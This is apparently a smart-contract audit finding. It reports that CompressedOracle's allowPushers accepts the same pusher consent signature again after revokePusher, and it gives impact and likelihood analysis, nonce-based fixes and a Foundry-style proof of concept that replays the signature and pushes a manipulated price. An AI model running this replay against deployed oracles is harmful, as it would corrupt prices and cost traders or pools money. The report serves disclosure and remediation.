### Title
Pusher delegation consent signature is replayable within the deadline window, allowing re-establishment of a revoked delegation — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers()` does not invalidate a pusher's consent signature after it is used, nor does it check whether the pusher has since self-revoked. A creator can replay the same EIP-191 consent signature any number of times before the deadline expires to silently re-establish a delegation the pusher explicitly cancelled via `revokePusher()`. This breaks the revocation invariant and can allow a compromised pusher key to continue writing bad prices into the creator's namespace after the pusher attempted to stop it.

---

### Finding Description

`allowPushers` signs over `(block.chainid, address(this), deadline, pusher, msg.sender)` and enforces only that the deadline has not passed:

```
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no per-signature consumed flag, no revocation-epoch counter, and no check that `namespaceRemapping[pusher]` was previously cleared by the pusher. The code comment acknowledges the deadline is the only replay guard:

> "an undated signature could re-establish a delegation AFTER the pusher revoked it" [2](#0-1) 

But the deadline only prevents replay **after** it expires. Within the window, the identical calldata is accepted unconditionally.

`revokePusher()` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

Nothing prevents the creator from immediately calling `allowPushers` again with the same `(deadline, pusher, sig)` tuple to restore `namespaceRemapping[pusher] = creator`.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So any push made by the pusher after the re-established delegation lands in the creator's namespace, not the pusher's own.

---

### Impact Explanation

**Medium.** The direct loss path is:

1. Pusher's private key is compromised. Pusher calls `revokePusher()` to stop the attacker from writing bad prices into the creator's namespace.
2. Creator (or an attacker who also holds the creator key) replays the original consent signature — still valid because the deadline has not expired — calling `allowPushers(deadline, [pusher], [sig])` again.
3. `namespaceRemapping[pusher]` is restored to `creator`.
4. The attacker with the compromised pusher key pushes an arbitrary packed slot word (bad mid price, sentinel spreads, or a future timestamp within `MAX_TIME_DRIFT`) into the creator's namespace via the `fallback` path.
5. `AnchoredPriceProvider` or `ProtectedPriceProvider` reads the creator's feed via `getOracleData` → `price()` and returns the corrupted bid/ask to the pool's `swap()`.

The pool's swap conservation and quote-sanity invariants (`0 < bid < ask`) depend entirely on the oracle returning a valid price. A bad price injected here causes traders to receive more than the curve permits or the pool to receive less than owed. [5](#0-4) 

---

### Likelihood Explanation

**Low.** Exploitation requires the creator to actively replay the signature (whether maliciously or inadvertently), and the pusher can mitigate by simply ceasing to push. However, the security model explicitly promises that `revokePusher()` terminates the delegation, and that promise is broken for the entire deadline window. The window can be up to any value the creator chose when calling `allowPushers` — there is no cap on `deadline`.

---

### Recommendation

Track a per-pusher revocation epoch or mark signatures as consumed. The simplest fix is a `mapping(address => uint256) public pusherNonce` incremented on every successful `allowPushers` and included in the signed digest:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

Alternatively, bump `pusherNonce[pusher]` inside `revokePusher()` so any previously issued signature is immediately invalidated:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    pusherNonce[msg.sender]++;          // invalidates all prior consent sigs
    emit PusherRevoked(msg.sender, creator);
}
```

---

### Proof of Concept

```solidity
// 1. Creator establishes delegation with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
bytes memory sig = abi.encodePacked(r, s, v);

address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;

vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation active

// 2. Pusher self-revokes (e.g. key compromise detected)
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 3. Creator replays the SAME signature — no new consent from pusher
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds — no revert
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation silently restored

// 4. Attacker (holding compromised pusher key) pushes a bad price
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 badRaw = _packRaw(9_999_999, 4, 2); // manipulated price
vm.prank(pusher); // attacker controls this key
(bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
assertTrue(ok);

// Bad price now lives in creator's namespace, consumed by pool via AnchoredPriceProvider
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(data.price, U64x32.decode(uint32(badRaw >> 16))); // bad price confirmed
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L101-117)
```text
    function getOracleData(bytes32 feedId) public view override returns (OracleData memory data) {
        (address creator, uint8 slotIndex, uint8 positionIndex) = _unpackFeedId(feedId);

        SlotLayout memory _layout = _loadSlotLayout(_oracleSlot(creator, slotIndex));
        CompressedOracleData memory compressed = _selectCompressedData(_layout, positionIndex);

        if (compressed.s1 == 0xff && compressed.s0 == 0xff) {
            data.spread1 = BPS_BASE;
            data.spread0 = BPS_BASE;
            return data;
        }

        data.price = U64x32.decode(compressed.p);
        data.spread0 = _decodeCodebookIndex(compressed.s0);
        data.spread1 = _decodeCodebookIndex(compressed.s1);
        data.timestampMs = _layout.timestampMs;
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
